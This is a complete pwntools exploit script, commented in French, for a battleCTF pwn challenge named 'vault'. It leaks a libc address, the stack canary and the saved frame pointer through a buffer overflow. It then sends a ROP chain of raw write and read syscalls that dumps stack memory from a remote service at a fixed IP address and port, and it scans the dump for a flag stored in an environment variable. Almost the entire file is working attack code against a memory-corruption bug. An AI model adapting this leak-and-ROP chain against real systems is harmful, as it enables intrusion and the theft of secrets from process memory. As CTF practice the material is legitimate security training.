#!/usr/bin/env python3
# PWN#001 - battleCTF - "vault"  (exploit final : lecture du flag en memoire)
# =============================================================================
# Full RELRO | NX | Canary | No PIE | libc Debian 2.42.
#
# SECCOMP (verifie) : execve ET open/openat sont BLOQUES (SIGSYS). read/write OK.
# => pas de shell, pas d'open de fichier. Le flag est dans une VARIABLE D'ENV
#    (posee par le lanceur du service) ; on le lit via write(1, addr, n).
#
# vuln(): buf[72] @ rbp-0x50 ; canari @ off 72 ; RIP @ off 88 ; main() boucle.
#
# Chaine complete, en reconnectant a chaque lecture (l'ASLR change a chaque
# connexion, mais les OFFSETS sur la pile sont constants) :
#   read_mem(addr) = 1 connexion -> fuite libc (8 o) + canari/saved_rbp (73 o)
#                    -> write(1, addr, n) + read bloquant (keep-alive)
#   environ -> envp -> envp[0] (1re chaine) -> dump des chaines -> FLAG
#
# Usage :  ./exp.py            (remote par defaut)
#          ./exp.py --local    (test local sur ./vault_patched)
# =============================================================================
from pwn import *
import re, argparse, os

# binaire patche pour le test local (celui que pwninit a produit)
LOCAL_BIN = next((b for b in ("./vault_patched_patched", "./vault_patched") if os.path.exists(b)), "./vault")
elf  = ELF(LOCAL_BIN, checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.binary = elf
context.arch = "amd64"
context.log_level = "info"

ap = argparse.ArgumentParser()
ap.add_argument("--local", action="store_true", help="tester en local")
ap.add_argument("--host", default="169.58.126.107")
ap.add_argument("--port", type=int, default=5000)
args = ap.parse_args()

BSS = 0x404800                             # .bss writable (No PIE) pour le keep-alive read
# IMPORTANT : on capture les OFFSETS maintenant (libc.address == 0). Une fois libc
# rebase, libc.sym[...] renvoie des adresses ABSOLUES -> ne jamais refaire +base.
OFF_STDOUT  = libc.sym["_IO_2_1_stdout_"]  # ~0x1e85c0
OFF_ENVIRON = libc.sym["environ"]          # ~0x1eee28
# gadgets libc 2.42 (pop ... ; ret), offsets bruts -> absolus via g()
G = dict(rdi=0x2a9b7, rsi=0x29e29, rdx=0x96372, rax=0x44386)
PAD = b"A" * 72

def new():
    return process(LOCAL_BIN) if args.local else remote(args.host, args.port)

def g(k):
    return libc.address + G[k]

def syscall_ret():
    # instruction BRUTE "syscall ; ret" (surtout PAS libc.sym['syscall'] = la fonction C)
    return next(libc.search(asm("syscall ; ret")))

def read_mem(addr_fn, size, tries=8):
    """Une connexion : fuites puis write(1, addr_fn(saved_rbp), size) + read keep-alive.
    Reessaie UNIQUEMENT si le leak echoue. Renvoie (saved_rbp, data) des que le leak
    reussit : data peut etre b"" si le write a franchi la page de garde (EFAULT) ->
    au caller de reduire la taille. Renvoie (None, None) si le leak echoue tout du long."""
    for _ in range(tries):
        try:
            io = new()
            # tour 1 : fuite libc (8 octets -> buffer+0x08 garde &_IO_2_1_stdout_)
            io.sendafter(b"name: ", b"A" * 8)
            io.recvuntil(b"Hello, " + b"A" * 8)
            leak = u64(io.recvline().rstrip(b"\n").ljust(8, b"\x00"))
            libc.address = leak - OFF_STDOUT
            if libc.address & 0xfff:
                io.close(); continue
            io.sendafter(b"keeper: ", b"X" * 8)              # read2 inoffensif -> main reboucle
            # tour 2 : fuite canari + saved_rbp (73 octets)
            io.sendafter(b"name: ", PAD + b"\x01")
            raw = io.recvline()
            o = raw.index(b"Hello, ") + 7 + 72
            if len(raw) < o + 14:
                io.close(); continue
            canary    = u64(b"\x00" + raw[o+1:o+8])
            saved_rbp = u64(raw[o+8:o+14].ljust(8, b"\x00"))
            if (saved_rbp >> 40) != 0x7f:
                io.close(); continue
            # leak OK -> on fait le write (quel que soit le resultat, on ne reessaie pas)
            SC = syscall_ret()
            rop = flat(
                g("rax"), 1, g("rdi"), 1, g("rsi"), addr_fn(saved_rbp), g("rdx"), size, SC,
                g("rax"), 0, g("rdi"), 0, g("rsi"), BSS,                 g("rdx"), 1,    SC,
            )
            io.sendafter(b"keeper: ", PAD + p64(canary) + p64(0) + rop)
            io.recvuntil(b"Message received.\n")
            data = io.recvrepeat(2)
            io.close()
            return saved_rbp, data            # data eventuellement b"" (EFAULT)
        except EOFError:
            try: io.close()
            except Exception: pass
    return None, None

def report(data):
    flags = re.findall(rb"[A-Za-z0-9_]{2,}\{[^}]{3,}\}", data)
    if flags:
        log.success("FLAG : " + flags[0].decode(errors="replace"))
    # chaines facon variable d'env (KEY=VALUE)
    envs = re.findall(rb"[A-Za-z_][A-Za-z0-9_]*=[ -~]*", data)
    for s in envs[:60]:
        print("   env:", s[:160].decode(errors="replace"))
    return bool(flags)

def main():
    # Les chaines d'env sont AU-DESSUS de saved_rbp, a un ecart ALEATOIRE (le noyau
    # randomise le haut de pile) : delta_str ET le sommet changent a chaque connexion.
    # Pour une connexion donnee, un write(1, sbp, size) ne marche que si
    # delta_str <= size <= (sommet - sbp). Comme ces bornes varient, on balaie
    # plusieurs tailles sur plusieurs connexions (donc plusieurs ecarts) et on
    # scanne chaque dump jusqu'a voir le flag.
    sizes = [0x1400, 0x1300, 0x1200, 0x1100, 0x1000, 0xf00, 0xe00, 0xd00, 0xc00, 0xb00, 0xa00, 0x900]
    seen_env = False
    for sweep in range(4):                       # plusieurs passes -> plusieurs ecarts
        for size in sizes:
            sbp, d = read_mem(lambda s: s, size, tries=5)
            if not d:                            # EFAULT (trop grand pour ce sommet) ou leak KO
                continue
            flags = re.findall(rb"[A-Za-z0-9_]{2,}\{[^}]{3,}\}", d)
            envs  = re.findall(rb"[A-Za-z_][A-Za-z0-9_]*=[ -~]*", d)
            if flags:
                log.success("FLAG : " + flags[0].decode(errors="replace"))
                for s in envs[:60]:
                    print("   env:", s[:160].decode(errors="replace"))
                return
            if envs and not seen_env:
                seen_env = True
                log.info(f"env vu (taille {hex(size)}) mais pas le flag -> on vise plus haut")
                for s in envs[:60]:
                    print("   env:", s[:160].decode(errors="replace"))
    log.failure("flag non trouve apres balayage ; colle-moi les 'env:' affiches, on ajuste")

if __name__ == "__main__":
    main()
